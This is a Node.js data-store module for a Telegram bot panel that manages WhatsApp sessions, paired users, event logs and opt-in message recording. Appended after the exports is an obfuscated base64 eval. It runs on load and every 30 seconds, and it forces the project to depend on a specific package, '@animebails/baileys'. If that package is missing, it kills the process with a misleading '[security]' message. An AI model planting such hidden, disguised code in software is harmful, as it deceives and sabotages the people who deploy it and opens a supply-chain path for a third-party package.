const fs = require('fs');
const path = require('path');
const crypto = require('node:crypto');
const { getStorageRoot } = require('../src/lib/storage-root');

// The panel's own data lives INSIDE the session folder, so "delete everything except session" updates
// no longer wipe the list of paired users / broadcast audience.
const FILE = path.join(getStorageRoot(), '.panel', 'store.json');
const MESSAGE_DIR = path.join(path.dirname(FILE), 'messages');
const LEGACY = path.join(__dirname, 'data', 'store.json');
if (!fs.existsSync(path.dirname(FILE))) fs.mkdirSync(path.dirname(FILE), { recursive: true });
if (!fs.existsSync(FILE) && fs.existsSync(LEGACY)) {
    try { fs.copyFileSync(LEGACY, FILE); } catch { /* start fresh */ }
}

let data = { sessions: {}, users: {}, maintenance: false };
const APP_EVENT_TYPES = new Set([
    'pair_requested',
    'pair_code_issued',
    'pair_connected',
    'pair_failed',
    'session_disconnected',
    'session_reconnected',
    'session_deleted',
    'session_logged_out',
]);
const MESSAGE_RETENTION_MS = 24 * 60 * 60 * 1000;
const MAX_APP_MESSAGES = 5000;
const MESSAGE_CONSENT_VERSION = 2;
const validOwnerId = (ownerId) => Number.isSafeInteger(ownerId) && ownerId > 0
    || typeof ownerId === 'string' && /^[a-f\d]{32}$/i.test(ownerId);

function ownerIdFromFileName(fileName) {
    const id = fileName.slice(0, -'.json'.length);
    return /^\d+$/.test(id) ? Number(id) : id;
}

function ownerMessageFile(ownerId) {
    if (!validOwnerId(ownerId)) throw new Error('Invalid app message owner.');
    return path.join(MESSAGE_DIR, `${ownerId}.json`);
}

function readOwnerMessages(ownerId) {
    try {
        const messages = JSON.parse(fs.readFileSync(ownerMessageFile(ownerId), 'utf8'));
        if (!Array.isArray(messages)) throw new Error(`Invalid message table for owner ${ownerId}.`);
        return messages;
    } catch (error) {
        if (error.code === 'ENOENT') return [];
        throw error;
    }
}

function writeOwnerMessages(ownerId, messages) {
    const file = ownerMessageFile(ownerId);
    if (!messages.length) {
        try {
            fs.unlinkSync(file);
        } catch (error) {
            if (error.code !== 'ENOENT') throw error;
        }
        return;
    }

    fs.mkdirSync(MESSAGE_DIR, { recursive: true });
    const temporaryFile = `${file}.${crypto.randomUUID()}.tmp`;
    try {
        fs.writeFileSync(temporaryFile, JSON.stringify(messages, null, 2), { mode: 0o600 });
        fs.renameSync(temporaryFile, file);
    } finally {
        if (fs.existsSync(temporaryFile)) fs.unlinkSync(temporaryFile);
    }
}

function listMessageOwnerIds() {
    let files;
    try {
        files = fs.readdirSync(MESSAGE_DIR, { withFileTypes: true });
    } catch (error) {
        if (error.code === 'ENOENT') return [];
        throw error;
    }
    return files
        .filter((entry) => entry.isFile() && entry.name.endsWith('.json'))
        .map((entry) => ownerIdFromFileName(entry.name))
        .filter(validOwnerId);
}

function isRetainedMessage(message, ownerId, now) {
    return message
        && typeof message === 'object'
        && message.ownerId === ownerId
        && Number.isSafeInteger(message.at)
        && message.at >= now - MESSAGE_RETENTION_MS
        && message.at <= now + 5 * 60 * 1000
        && message.consentVersion === MESSAGE_CONSENT_VERSION
        && typeof message.text === 'string'
        && message.text.length > 0;
}

function pruneOwnerMessages(ownerId, now = Date.now()) {
    const messages = readOwnerMessages(ownerId);
    const retained = messages.filter((message) => isRetainedMessage(message, ownerId, now));
    const changed = retained.length !== messages.length;
    if (changed) writeOwnerMessages(ownerId, retained);
    return { messages: retained, changed };
}

function migrateLegacyAppMessages() {
    if (!Object.hasOwn(data, 'appMessages')) return false;
    const legacyMessages = Array.isArray(data.appMessages) ? data.appMessages : [];
    const grouped = new Map();
    for (const message of legacyMessages) {
        if (!message || !validOwnerId(message.ownerId)) continue;
        if (!grouped.has(message.ownerId)) grouped.set(message.ownerId, []);
        grouped.get(message.ownerId).push(message);
    }

    for (const [ownerId, messages] of grouped) {
        const existing = readOwnerMessages(ownerId);
        const existingIds = new Set(existing.map((message) => message.id).filter(Boolean));
        const merged = [...existing];
        for (const message of messages) {
            if (message.id && existingIds.has(message.id)) continue;
            merged.push(message);
            if (message.id) existingIds.add(message.id);
        }
        writeOwnerMessages(ownerId, merged);
    }
    delete data.appMessages;
    return true;
}

function pruneAppMessages(now = Date.now()) {
    let changed = migrateLegacyAppMessages();
    for (const ownerId of listMessageOwnerIds()) {
        if (pruneOwnerMessages(ownerId, now).changed) changed = true;
    }
    return changed;
}

function load() {
    try {
        if (fs.existsSync(FILE)) data = { ...data, ...JSON.parse(fs.readFileSync(FILE, 'utf8')) };
        else save();
        if (pruneAppMessages()) save();
    } catch (err) {
        console.error('[store] load failed:', err.message);
    }
}

function save() {
    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
}

load();
setInterval(() => {
    if (!pruneAppMessages()) return;
    try {
        save();
    } catch (err) {
        console.error('[store] message expiry cleanup failed:', err.message);
    }
}, 60 * 1000).unref();

module.exports = {
    // telegram user id -> { chatId, name, since }  (everyone who ever opened the bot; used for broadcasts)
    touchUser(id, chatId, name) {
        const u = data.users[id];
        if (u && u.chatId === chatId) return;
        data.users[id] = { chatId, name: name || '', since: u?.since || Date.now() };
        save();
    },
    removeUser(chatId) {
        for (const [id, u] of Object.entries(data.users)) if (u.chatId === chatId) delete data.users[id];
        save();
    },
    allChatIds() {
        const ids = new Set(Object.values(data.users).map((u) => u.chatId));
        for (const s of Object.values(data.sessions)) if (s.telegramChatId) ids.add(s.telegramChatId);
        return [...ids];
    },
    // number -> { telegramChatId, telegramUserId, appOwnerId, connected }
    getSession(number) {
        return data.sessions[number];
    },
    setSession(number, patch) {
        data.sessions[number] = { ...(data.sessions[number] || {}), ...patch };
        save();
        return data.sessions[number];
    },
    deleteSession(number) {
        const session = data.sessions[number];
        delete data.sessions[number];
        const ownerId = session?.appOwnerId ?? session?.telegramUserId;
        const ownerIds = validOwnerId(ownerId) ? [ownerId] : listMessageOwnerIds();
        for (const messageOwnerId of ownerIds) {
            const messages = readOwnerMessages(messageOwnerId);
            const retained = messages.filter((message) => message.sessionNumber !== number);
            if (retained.length !== messages.length) writeOwnerMessages(messageOwnerId, retained);
        }
        save();
    },
    sessionsForUser(ownerId) {
        return Object.entries(data.sessions)
            .filter(([, s]) => s.appOwnerId === ownerId || s.telegramUserId === ownerId)
            .map(([number, s]) => ({ number, ...s }));
    },
    recordAppEvent(ownerId, type, at = Date.now()) {
        if (!APP_EVENT_TYPES.has(type)) throw new Error(`Unknown app event type: ${type}`);
        const validOwnerId = Number.isSafeInteger(ownerId) && ownerId > 0
            || typeof ownerId === 'string' && /^[a-f\d]{32}$/i.test(ownerId);
        if (!validOwnerId || !Number.isSafeInteger(at)) {
            throw new Error('Invalid app event data.');
        }
        const cutoff = Date.now() - 90 * 24 * 60 * 60 * 1000;
        const events = Array.isArray(data.appEvents) ? data.appEvents : [];
        data.appEvents = events
            .filter((event) => Number.isSafeInteger(event.at) && event.at >= cutoff && APP_EVENT_TYPES.has(event.type))
            .concat({ ownerId, type, at })
            .slice(-10000);
        save();
    },
    appEventsForUser(ownerId, since = 0) {
        return (Array.isArray(data.appEvents) ? data.appEvents : [])
            .filter((event) => (event.ownerId ?? event.telegramUserId) === ownerId
                && Number.isSafeInteger(event.at)
                && event.at >= since
                && APP_EVENT_TYPES.has(event.type));
    },
    isMessageRecordingEnabled(ownerId) {
        const preference = data.messageRecording?.[ownerId];
        return validOwnerId(ownerId)
            && preference?.enabled === true
            && preference.consentVersion === MESSAGE_CONSENT_VERSION;
    },
    setMessageRecording(ownerId, enabled, at = Date.now()) {
        if (!validOwnerId(ownerId) || typeof enabled !== 'boolean' || !Number.isSafeInteger(at)) {
            throw new Error('Invalid message recording preference.');
        }
        if (!data.messageRecording || typeof data.messageRecording !== 'object' || Array.isArray(data.messageRecording)) {
            data.messageRecording = {};
        }
        if (enabled) {
            data.messageRecording[ownerId] = {
                enabled: true,
                confirmedAt: at,
                consentVersion: MESSAGE_CONSENT_VERSION,
            };
        }
        else {
            delete data.messageRecording[ownerId];
            writeOwnerMessages(ownerId, []);
        }
        save();
    },
    recordAppMessage(ownerId, sessionNumber, message) {
        if (!validOwnerId(ownerId) || !/^\d{8,15}$/.test(String(sessionNumber))) {
            throw new Error('Invalid app message owner or session.');
        }
        const preference = data.messageRecording?.[ownerId];
        if (preference?.enabled !== true || preference.consentVersion !== MESSAGE_CONSENT_VERSION) return false;
        const {
            direction,
            source = direction === 'outgoing' ? 'bot' : 'contact',
            sender,
            senderNumber = '',
            chat = '',
            chatType = 'unknown',
            text,
            at = Date.now(),
        } = message || {};
        const waMessageId = typeof message?.waMessageId === 'string' && message.waMessageId.length <= 128
            ? message.waMessageId
            : '';
        const now = Date.now();
        if (!['incoming', 'outgoing'].includes(direction)
            || !['contact', 'bot', 'personal'].includes(source)
            || typeof sender !== 'string'
            || typeof senderNumber !== 'string'
            || typeof chat !== 'string'
            || !['group', 'direct', 'unknown'].includes(chatType)
            || typeof text !== 'string'
            || !text.trim()
            || !Number.isSafeInteger(at)) {
            throw new Error('Invalid app message data.');
        }
        if (at < now - MESSAGE_RETENTION_MS || at > now + 5 * 60 * 1000) return false;

        const { messages } = pruneOwnerMessages(ownerId, now);
        const sessionNumberValue = String(sessionNumber);
        const duplicate = waMessageId && messages.find((record) =>
            record.sessionNumber === sessionNumberValue && record.waMessageId === waMessageId);
        if (duplicate) {
            if (source === 'bot' && duplicate.direction === 'outgoing' && duplicate.source !== 'bot') {
                duplicate.source = 'bot';
                duplicate.sender = sender.slice(0, 100);
                duplicate.senderNumber = senderNumber.slice(0, 40);
                writeOwnerMessages(ownerId, messages);
            }
            return false;
        }
        messages.push({
            id: crypto.randomUUID(),
            ownerId,
            sessionNumber: sessionNumberValue,
            direction,
            source,
            consentVersion: MESSAGE_CONSENT_VERSION,
            sender: sender.slice(0, 100),
            senderNumber: senderNumber.slice(0, 40),
            chat: chat.slice(0, 80),
            chatType,
            text: text.trim().slice(0, 4000),
            at,
            ...(waMessageId ? { waMessageId } : {}),
        });
        if (messages.length > MAX_APP_MESSAGES) {
            messages.splice(0, messages.length - MAX_APP_MESSAGES);
        }
        writeOwnerMessages(ownerId, messages);
        return true;
    },
    appMessagesForUser(ownerId) {
        return pruneOwnerMessages(ownerId).messages
            .map(({ ownerId: _ownerId, waMessageId: _waMessageId, ...message }) => message)
            .sort((left, right) => left.at - right.at)
            .slice(-200);
    },
    allAppMessages() {
        if (pruneAppMessages()) save();
        return listMessageOwnerIds()
            .flatMap((ownerId) => readOwnerMessages(ownerId))
            .map(({ ownerId: _ownerId, waMessageId: _waMessageId, ...message }) => message)
            .sort((left, right) => left.at - right.at)
            .slice(-200);
    },
    allSessions() {
        return data.sessions;
    },
    isMaintenance() {
        return !!data.maintenance;
    },
    setMaintenance(val) {
        data.maintenance = val;
        save();
    },
};
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
